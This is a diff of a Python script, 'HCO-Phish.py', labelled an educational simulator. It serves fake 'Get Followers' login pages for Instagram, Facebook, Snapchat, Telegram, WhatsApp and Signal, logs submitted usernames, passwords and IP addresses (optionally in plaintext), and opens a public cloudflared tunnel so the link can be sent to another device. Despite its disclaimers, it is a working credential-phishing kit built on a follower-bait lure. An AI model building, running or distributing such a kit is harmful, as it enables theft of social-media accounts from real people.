@@ -1,238 +1,274 @@
 #!/usr/bin/env python3
 """
-HCO-Phish.py — Single-file educational simulator (auto cloudflared, realistic pages)
+HCO-Phish.py — Single-file Educational Simulator (safe)
 
-USAGE (Termux):
-1) pkg update && pkg install python -y
-2) pip install Flask colorama requests
-3) (optional) install cloudflared and put it in PATH if you want a public HTTPS link
-4) python3 HCO-Phish.py
+Features:
+- Colorful lock screen with countdown and YouTube redirect.
+- Bold ASCII banner "HCO-Phish by Azhar" (red text on blue background in Termux when colorama available).
+- Terminal menu (1..6) for Instagram, Facebook, Snapchat, Telegram, WhatsApp, Signal.
+- Starts local Flask server serving 6 simulation pages with icons and follower choices (100, 1,000, 10,000).
+- Best-effort auto-start of cloudflared and extraction of public trycloudflare URL for sharing to a second device.
+- Subtle footer on pages: "Educational simulation — do not enter real credentials."
+- Logs submitted username and either plaintext or SHA256 hash (depending on runtime confirmation) to simulation_log.txt and prints to console.
+- Single-file, ready to upload to GitHub.
 
-At startup you must confirm you will only use demo/test accounts. If you decline,
-passwords will be hashed instead of saved/displayed.
+SAFETY: Use only on your own devices/accounts or with explicit permission. Do not use for illicit activity.
 """
-import os, sys, time, re, hashlib, subprocess, threading, webbrowser
+import os
+import sys
+import time
+import re
+import hashlib
+import subprocess
+import threading
+import webbrowser
 from datetime import datetime
 from shutil import which
 
-# check Flask
+# --- Dependencies check ---
 try:
     from flask import Flask, render_template_string, request
 except Exception:
-    print("Missing Flask. Install: pip install Flask")
+    print("Missing Flask. Install with: pip install Flask")
     sys.exit(1)
 
-# optional colorama
 try:
-    from colorama import init as color_init, Fore, Back, Style
-    color_init(autoreset=True)
-    USE_COLOR = True
+    from colorama import init as colorama_init, Fore, Back, Style
+    colorama_init(autoreset=True)
+    HAS_COLORAMA = True
 except Exception:
+    HAS_COLORAMA = False
     class _C: pass
     Fore = Back = Style = _C()
     Fore.RED = Fore.GREEN = Fore.YELLOW = Fore.CYAN = Fore.WHITE = ""
     Back.BLUE = ""
     Style.RESET_ALL = ""
-    USE_COLOR = False
 
-# ---------------- CONFIG ----------------
+# ---------------- Config ----------------
 APP_HOST = "127.0.0.1"
 APP_PORT = 5000
 YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
-CLOUDFLARED_BIN = "cloudflared"
-CLOUDFLARED_TIMEOUT = 20  # seconds to wait for public URL
+CLOUDFLARED_BIN = "cloudflared"   # must be in PATH to auto-start
+CLOUDFLARED_TIMEOUT = 25          # seconds to wait for trycloudflare link
 LOGFILE = "simulation_log.txt"
-TEMPLATES = ["instagram","facebook","snapchat","telegram","whatsapp","signal"]
+TEMPLATE_KEYS = ["instagram", "facebook", "snapchat", "telegram", "whatsapp", "signal"]
+ICON_MAP = {
+    "instagram": "📷",
+    "facebook":  "📘",
+    "snapchat":  "👻",
+    "telegram":  "✈️",
+    "whatsapp":  "💬",
+    "signal":    "🔵"
+}
 # ----------------------------------------
 
-# realistic-ish HTML pages (no copyrighted logos; emoji + CSS)
-BASE_INDEX = """<!doctype html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Welcome</title>
+# Embedded HTML templates (render_template_string)
+INDEX_HTML = """
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HCO-Phish Simulator</title>
 <style>
-body{font-family:Inter,Arial,Helvetica;background:#f3f6fb;margin:0;color:#111}
-.container{max-width:760px;margin:40px auto;padding:24px;background:white;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.08);text-align:center}
-.grid{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:12px}
-.btn{padding:12px 18px;border-radius:10px;background:#0b84ff;color:#fff;text-decoration:none;font-weight:700}
-.note{color:#666;margin-top:16px;font-size:13px}
-.footer{font-size:12px;color:#999;margin-top:20px}
-</style></head><body>
-<div class="container">
-  <h1>HCO-Phish — Simulator</h1>
-  <p style="color:#444">Choose a platform to demo the "Get Followers" workflow.</p>
-  <div class="grid">
-    {% for key,label,icon in items %}
-      <a class="btn" href="/simulate/{{key}}">{{icon}} {{label}}</a>
-    {% endfor %}
-  </div>
-  <p class="note">Open the page on your test device (use the Local or Public URL printed in Termux).</p>
-  <div class="footer">This page is part of a controlled lab simulation for educational purposes only.</div>
-</div>
-</body></html>
-"""
-
-# Template for simulated login pages — looks realistic
-FORM_HTML = """<!doctype html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>{{label}}</title>
-<style>
-body{font-family:Inter,Arial,Helvetica;background:#eef2f7;margin:0;color:#111}
-.wrap{max-width:420px;margin:40px auto;padding:18px;background:#fff;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.08)}
-.header{display:flex;align-items:center;gap:12px;padding-bottom:8px;border-bottom:1px solid #eee}
-.icon{font-size:40px}
-.h{font-size:18px;font-weight:700}
-.small{color:#666;font-size:13px;margin-top:6px}
-.form{padding-top:12px}
-select,input{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #ddd}
-.btn{width:100%;padding:12px;border-radius:8px;border:none;background:#0b84ff;color:white;font-weight:700}
-.foot{font-size:12px;color:#999;margin-top:12px;text-align:center}
-</style></head><body>
-<div class="wrap">
-  <div class="header">
-    <div class="icon">{{icon}}</div>
-    <div>
-      <div class="h">{{label}}</div>
-      <div class="small">Get free followers — quick demo</div>
+body{font-family:Inter, system-ui, Arial, sans-serif; background:#f3f6fb; margin:0; color:#111}
+.container{max-width:840px;margin:40px auto;padding:24px;background:#fff;border-radius:12px;box-shadow:0 12px 40px rgba(10,20,40,0.06);text-align:center}
+.grid{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:16px}
+.card{min-width:160px;padding:14px;border-radius:10px;background:#0b84ff;color:#fff;text-decoration:none;font-weight:700;display:inline-flex;align-items:center;gap:8px;justify-content:center}
+.note{color:#666;margin-top:14px;font-size:13px}
+.footer{font-size:12px;color:#999;margin-top:18px}
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>HCO-Phish — Educational Simulator</h1>
+    <p class="note">Choose a platform to preview the simulated "Get Followers" page.</p>
+    <div class="grid">
+      {% for key,label,icon in items %}
+        <a class="card" href="/simulate/{{key}}">{{icon}} &nbsp; {{label}}</a>
+      {% endfor %}
     </div>
+    <div class="footer">This is a controlled educational simulation — do not enter real account credentials.</div>
   </div>
-  <div class="form">
-    <form action="/submit" method="post">
-      <input type="hidden" name="template" value="{{label}}">
-      <label>Select followers package</label>
-      <select name="followers">
-        <option value="100">100</option>
-        <option value="1000">1,000</option>
-        <option value="10000">10,000</option>
-      </select>
-      <input name="username" placeholder="Username" required>
-      <input type="password" name="password" placeholder="Password" required>
-      <button class="btn" type="submit">Get Followers</button>
-    </form>
-  </div>
-  <div class="foot">For training only — do not enter real account credentials.</div>
-</div>
-</body></html>
+</body>
+</html>
 """
 
-DONE_HTML = """<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Done</title><style>body{font-family:Inter,Arial;background:#0b1724;color:white;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.box{background:#b71c34;padding:24px;border-radius:10px;text-align:center}</style></head><body><div class="box"><h1>Submitted</h1><p>Thank you — your selection has been recorded for the simulation.</p><p style="font-size:13px"><a href="/" style="color:#fff">Return</a></p></div></body></html>"""
+FORM_HTML = """
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{label}} — Get Followers</title>
+<style>
+:root{--accent:#0b84ff;--muted:#666}
+body{font-family:Inter, system-ui, Arial, sans-serif;background:#eef2f7;margin:0;color:#111}
+.wrap{max-width:420px;margin:36px auto;padding:18px;background:white;border-radius:12px;box-shadow:0 10px 30px rgba(10,20,40,0.06)}
+.header{display:flex;align-items:center;gap:12px;padding-bottom:8px;border-bottom:1px solid #f0f0f0}
+.icon{font-size:44px}
+.title{font-size:18px;font-weight:700}
+.subtitle{color:var(--muted);font-size:13px}
+.form{padding-top:12px}
+label{display:block;font-size:13px;margin-top:8px;color:#333}
+select,input{width:100%;padding:10px;margin-top:6px;border-radius:8px;border:1px solid #ddd;box-sizing:border-box}
+.btn{width:100%;padding:12px;border-radius:8px;border:none;background:var(--accent);color:white;font-weight:700;margin-top:12px}
+.foot{font-size:12px;color:#999;margin-top:12px;text-align:center}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="header">
+      <div class="icon">{{icon}}</div>
+      <div>
+        <div class="title">{{label}}</div>
+        <div class="subtitle">Simulated "Get Followers" demo</div>
+      </div>
+    </div>
+    <div class="form">
+      <form action="/submit" method="post">
+        <input type="hidden" name="template" value="{{label}}">
+        <label>Select followers package</label>
+        <select name="followers">
+          <option value="100">100</option>
+          <option value="1000">1,000</option>
+          <option value="10000">10,000</option>
+        </select>
+        <label>Username</label>
+        <input name="username" placeholder="username" required>
+        <label>Password</label>
+        <input type="password" name="password" placeholder="password" required>
+        <button class="btn" type="submit">Get Followers</button>
+      </form>
+    </div>
+    <div class="foot">Educational simulation — do not enter real account credentials.</div>
+  </div>
+</body>
+</html>
+"""
+
+DONE_HTML = """
+<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Submitted</title>
+<style>body{font-family:Inter,system-ui,Arial;background:#0b1724;color:white;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}.box{background:#b71c34;padding:22px;border-radius:10px;text-align:center}a{color:#fff}</style></head>
+<body><div class="box"><h1>Submission recorded</h1><p>Thank you — this submission is stored in the simulation log for demonstration.</p><p><a href="/">Return</a></p></div></body></html>
+"""
 
 # ---------------- Flask app ----------------
 from flask import Flask, render_template_string, request
 app = Flask(__name__)
 
-# helper log functions
 def init_log():
     if not os.path.exists(LOGFILE):
-        with open(LOGFILE,"w",encoding="utf-8") as f:
+        with open(LOGFILE, "w", encoding="utf-8") as f:
             f.write("*** SIMULATION ONLY - DO NOT USE REAL CREDENTIALS ***\n")
             f.write(f"Created: {datetime.utcnow().isoformat()} UTC\n\n")
 
-def save_plain(template, followers, username, password, ip):
+def log_plain(template, followers, username, password, ip):
     init_log()
     ts = datetime.utcnow().isoformat()
-    line = f"[{ts}] {template} | followers={followers} | user={username} | pass={password} | ip={ip}\n"
-    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(line)
-    print(Fore.YELLOW + "[CAPTURED]" + Style.RESET_ALL, line.strip())
+    entry = f"[{ts}] {template} | followers={followers} | user={username} | pass={password} | ip={ip}\n"
+    with open(LOGFILE, "a", encoding="utf-8") as f:
+        f.write(entry)
+    print(f"{Fore.YELLOW}[CAPTURED]{Style.RESET_ALL} {entry.strip()}")
 
-def save_hashed(template, followers, username, password, ip):
+def log_hashed(template, followers, username, password, ip):
     init_log()
     ts = datetime.utcnow().isoformat()
     ph = hashlib.sha256(password.encode("utf-8")).hexdigest()
-    line = f"[{ts}] {template} | followers={followers} | user={username} | pass_sha256={ph} | ip={ip}\n"
-    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(line)
-    print(Fore.CYAN + "[LOGGED]" + Style.RESET_ALL, f"{ts} | {template} | {username} | {ph[:12]}...")
+    entry = f"[{ts}] {template} | followers={followers} | user={username} | pass_sha256={ph} | ip={ip}\n"
+    with open(LOGFILE, "a", encoding="utf-8") as f:
+        f.write(entry)
+    print(f"{Fore.CYAN}[LOGGED]{Style.RESET_ALL} {ts} | {template} | {username} | {ph[:12]}...")
 
 @app.route("/")
 def index():
     items = []
-    # use emoji icons to make it look familiar
-    icon_map = {
-        "instagram":"📷","facebook":"📘","snapchat":"👻","telegram":"✈️","whatsapp":"💬","signal":"🔵"
-    }
-    for k in TEMPLATES:
-        items.append((k, k.capitalize(), icon_map.get(k, "🔰")))
-    return render_template_string(BASE_INDEX, items=items)
+    for k in TEMPLATE_KEYS:
+        items.append((k, k.capitalize(), ICON_MAP.get(k, "🔰")))
+    return render_template_string(INDEX_HTML, items=items)
 
 @app.route("/simulate/<name>")
 def simulate(name):
-    name_l = name.lower()
-    if name_l not in TEMPLATES:
+    name_l = str(name).lower()
+    if name_l not in TEMPLATE_KEYS:
         return "Not found", 404
-    icon_map = {"instagram":"📷","facebook":"📘","snapchat":"👻","telegram":"✈️","whatsapp":"💬","signal":"🔵"}
-    return render_template_string(FORM_HTML, label=name_l.capitalize(), icon=icon_map.get(name_l,"🔰"))
+    icon = ICON_MAP.get(name_l, "🔰")
+    label = name_l.capitalize()
+    return render_template_string(FORM_HTML, label=label, icon=icon)
 
 @app.route("/submit", methods=["POST"])
 def submit():
-    tpl = request.form.get("template","Unknown")
-    followers = request.form.get("followers","N/A")
-    user = request.form.get("username","")
-    pwd = request.form.get("password","")
+    tpl = request.form.get("template", "Unknown")
+    followers = request.form.get("followers", "N/A")
+    username = request.form.get("username", "")
+    password = request.form.get("password", "")
     ip = request.remote_addr
-    if STORE_PLAIN:
-        save_plain(tpl, followers, user, pwd, ip)
+    if STORE_PLAINTEXT:
+        log_plain(tpl, followers, username, password, ip)
     else:
-        save_hashed(tpl, followers, user, pwd, ip)
+        log_hashed(tpl, followers, username, password, ip)
     return render_template_string(DONE_HTML)
 
-# --------------- cloudflared helper ---------------
+# ---------------- Cloudflared helper ----------------
 def start_cloudflared_and_get_url(host=APP_HOST, port=APP_PORT, timeout=CLOUDFLARED_TIMEOUT):
     if not which(CLOUDFLARED_BIN):
-        print(Fore.YELLOW + "[!]" + Style.RESET_ALL, f"'{CLOUDFLARED_BIN}' not found in PATH. Install cloudflared to auto-create a public URL.")
+        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} '{CLOUDFLARED_BIN}' not found in PATH. Install cloudflared to enable public tunnel.")
         return None, None
     cmd = [CLOUDFLARED_BIN, "tunnel", "--url", f"http://{host}:{port}", "--no-autoupdate"]
     try:
         p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     except Exception as e:
-        print(Fore.RED + "[!]" + Style.RESET_ALL, "Failed to start cloudflared:", e)
+        print(f"{Fore.RED}[!]{Style.RESET_ALL} Failed to start cloudflared: {e}")
         return None, None
-    public = None
+    public_url = None
+    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} cloudflared started — waiting up to {timeout}s for public URL...")
     start = time.time()
-    outbuf = ""
-    print(Fore.GREEN + "[*]" + Style.RESET_ALL, "Started cloudflared — waiting for public URL...")
-    # read incrementally
+    buffer = ""
+    # Read incrementally and print output to terminal
     while time.time() - start < timeout:
         if p.poll() is not None:
             break
         try:
             ch = p.stdout.read(1)
-            if ch:
-                outbuf += ch
-                # flush line prints
-                if "\n" in outbuf:
-                    lines = outbuf.splitlines(True)
-                    for ln in lines:
-                        if ln.endswith("\n"):
-                            print(Fore.MAGENTA + "[cloudflared]" + Style.RESET_ALL, ln.strip())
-                    outbuf = ""
-                # quick regex search in buffer for trycloudflare link
-                m = re.search(r"(https://[^\s\"']+trycloudflare[^\s\"']*)", ch + (p.stdout.read(200) if p.stdout else ""))
-                if m:
-                    public = m.group(1)
-                    break
-            else:
+            if not ch:
                 time.sleep(0.1)
+                continue
+            buffer += ch
+            # flush any full lines for debug
+            if "\n" in buffer:
+                lines = buffer.splitlines(True)
+                for ln in lines:
+                    if ln.endswith("\n"):
+                        print(f"{Fore.MAGENTA}[cloudflared]{Style.RESET_ALL} {ln.strip()}")
+                buffer = ""
+            # try to extract trycloudflare link from stdout
+            # read a bit more to improve detection
+            tail = (p.stdout.read(200) or "")
+            text_chunk = ch + tail
+            m = re.search(r"(https://[^\s'\"<>]*trycloudflare[^\s'\"<>]*)", text_chunk)
+            if m:
+                public_url = m.group(1)
+                break
         except Exception:
             time.sleep(0.1)
-    # try to read remainder
-    if not public:
+    # final attempt to read bulk output
+    if not public_url:
         try:
             rest = p.stdout.read()
             if rest:
                 print(rest)
-                m2 = re.search(r"(https://[^\s\"']+trycloudflare[^\s\"']*)", rest)
+                m2 = re.search(r"(https://[^\s'\"<>]*trycloudflare[^\s'\"<>]*)", rest)
                 if m2:
-                    public = m2.group(1)
+                    public_url = m2.group(1)
         except Exception:
             pass
-    if public:
-        print(Fore.GREEN + "[*]" + Style.RESET_ALL, "Detected public URL:", public)
+    if public_url:
+        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Detected public URL: {public_url}")
     else:
-        print(Fore.YELLOW + "[!]" + Style.RESET_ALL, "Could not auto-detect trycloudflare link. Inspect cloudflared output above.")
-    return p, public
+        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Could not auto-detect trycloudflare link. Inspect cloudflared output above for the public URL.")
+    return p, public_url
 
-# ---------------- URL opener --------------------
-def open_url_android(url):
+# ---------------- URL open helpers ----------------
+def open_url_prefer_android(url):
     # try termux-open-url, am start, xdg-open, then webbrowser
     try:
         if which("termux-open-url"):
@@ -257,79 +293,106 @@ def open_url_android(url):
     except Exception:
         return False
 
-# --------------- Terminal UI & run ----------------
+# ---------------- Terminal UI ----------------
 def colorful_countdown():
-    for i in range(8,0,-1):
-        if USE_COLOR:
+    for i in range(8, 0, -1):
+        if HAS_COLORAMA:
             print(Fore.RED + f"Unlocking in {i}..." + Style.RESET_ALL)
         else:
             print(f"Unlocking in {i}...")
         time.sleep(1)
 
 def print_banner():
-    banner = "╔" + "═"*30 + "╗\n" + "║" + " HCO-Phish by Azhar ".center(30) + "║\n" + "╚" + "═"*30 + "╝"
-    if USE_COLOR:
+    banner = "╔" + "═" * 30 + "╗\n" + "║" + " HCO-Phish by Azhar ".center(30) + "║\n" + "╚" + "═" * 30 + "╝"
+    if HAS_COLORAMA:
         print(Back.BLUE + Fore.RED + banner + Style.RESET_ALL)
     else:
         print(banner)
 
-STORE_PLAIN = False
+def show_menu_and_get_choice():
+    print("\n" + "=" * 48)
+    print("MENU — choose a template (enter number):")
+    for i, key in enumerate(TEMPLATE_KEYS, start=1):
+        print(f"{i}) {ICON_MAP.get(key,'🔰')}  {key.capitalize()}")
+    print("0) Exit")
+    choice = input("Select (0-6): ").strip()
+    if not choice.isdigit():
+        print(f"{Fore.RED}Invalid input{Style.RESET_ALL}")
+        return None
+    c = int(choice)
+    if c == 0:
+        sys.exit(0)
+    if 1 <= c <= len(TEMPLATE_KEYS):
+        return TEMPLATE_KEYS[c - 1]
+    else:
+        print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
+        return None
+
+# ---------------- Main ----------------
+STORE_PLAINTEXT = False
 
 def main():
-    global STORE_PLAIN
+    global STORE_PLAINTEXT
     os.system("clear")
-    print("="*60)
-    print("HCO-Phish — Educational Simulator (single file)")
-    print("="*60)
-    print("WARNING: This tool can capture credentials entered on the demo pages.")
+    print("=" * 60)
+    print("HCO-Phish — Educational Simulator (single-file)")
+    print("=" * 60)
+    print("WARNING: This tool can capture inputs on the demo pages.")
     print("Only use test/dummy accounts and devices you own or have permission to test.")
-    a = input("Do you want submitted credentials to be shown and saved as PLAINTEXT? (y/N): ").strip().lower()
-    if a == "y":
+    ans = input("Do you want submitted credentials to be shown and saved as PLAINTEXT? (y/N): ").strip().lower()
+    if ans == "y":
+        STORE_PLAINTEXT = True
         print(Fore.RED + "*** PLAINTEXT storage enabled. Use responsibly. ***" + Style.RESET_ALL)
-        STORE_PLAIN = True
     else:
+        STORE_PLAINTEXT = False
         print("Credentials will be stored as SHA256 hashes (safer).")
-        STORE_PLAIN = False
 
-    input("\nPress ENTER to unlock (this will run a countdown and attempt to open your YouTube channel)...")
+    input("\nPress ENTER to unlock (this runs countdown and attempts to open your YouTube channel)...")
     colorful_countdown()
-    print("\n[*] Attempting to open your YouTube channel...")
-    opened = open_url_android(YOUTUBE_LINK)
+    print("\n[*] Attempting to open YouTube channel...")
+    opened = open_url_prefer_android(YOUTUBE_LINK)
     if not opened:
-        print(Fore.YELLOW + "[!] Could not open YouTube automatically. Please open this link manually:" + Style.RESET_ALL)
-        print(YOUTUBE_LINK)
+        print(f"{Fore.YELLOW}[!] Could not open YouTube automatically. Please open this link manually: {YOUTUBE_LINK}{Style.RESET_ALL}")
     input("After returning from YouTube, press ENTER to continue...")
 
     os.system("clear")
     print_banner()
 
-    print("\nStarting local Flask server...")
+    # show menu
+    selection = None
+    while not selection:
+        selection = show_menu_and_get_choice()
+    print(f"\n[*] You selected: {selection.capitalize()}")
+
+    # start Flask server
+    print("\n[*] Starting local Flask server...")
     flask_thread = threading.Thread(target=lambda: app.run(host=APP_HOST, port=APP_PORT, debug=False, use_reloader=False), daemon=True)
     flask_thread.start()
     time.sleep(1.0)
 
-    # Ask to automatically start cloudflared
+    # ask to auto-start cloudflared
     use_cf = input("Start cloudflared automatically if available to create a public HTTPS link? (y/N): ").strip().lower()
     cf_proc = None
     public_url = None
     if use_cf == "y":
         cf_proc, public_url = start_cloudflared_and_get_url()
-    local_url = f"http://{APP_HOST}:{APP_PORT}"
+    local_demo = f"http://{APP_HOST}:{APP_PORT}/simulate/{selection}"
     print("\n--- Access URLs ---")
-    print("Local (LAN):", local_url)
+    print("Local (LAN):", local_demo)
     if public_url:
-        # ensure simulate path appended
-        pub_full = public_url.rstrip("/") + "/simulate/instagram"
-        print("Public (copy to your second phone):", pub_full)
+        pub_full = public_url.rstrip("/") + f"/simulate/{selection}"
+        print("Public (copy to your second device):", pub_full)
     else:
         if cf_proc:
-            print(Fore.YELLOW + "[!] cloudflared running but public trycloudflare link not auto-detected. Inspect cloudflared output in this terminal." + Style.RESET_ALL)
+            print(f"{Fore.YELLOW}[!] cloudflared started but public URL not auto-detected. Inspect cloudflared output above.{Style.RESET_ALL}")
+            print("If cloudflared printed a trycloudflare URL, append '/simulate/<template>' and open it on your test device.")
         else:
-            print(Fore.YELLOW + "[!] cloudflared not started. To expose publicly, install cloudflared and run in another termux session:" + Style.RESET_ALL)
+            print(f"{Fore.YELLOW}[!] cloudflared not started. To expose publicly, install cloudflared and run in another Termux session:{Style.RESET_ALL}")
             print("    cloudflared tunnel --url http://127.0.0.1:5000")
-    print("\nOpen the Local or Public URL on your testing phone and go to /simulate/<platform> (e.g. /simulate/instagram).")
-    print("When a form is submitted, the result will appear here and be saved in", LOGFILE)
-    print("Press Ctrl+C here to stop the server and cloudflared when finished.")
+
+    print("\nOpen the Local or Public URL on your test device to demo the page.")
+    print("When the simulated form is submitted, the result will be shown in this Termux terminal and saved to", LOGFILE)
+    print("Press Ctrl+C in this Termux session to stop the server and cloudflared when finished.")
 
     try:
         while True:
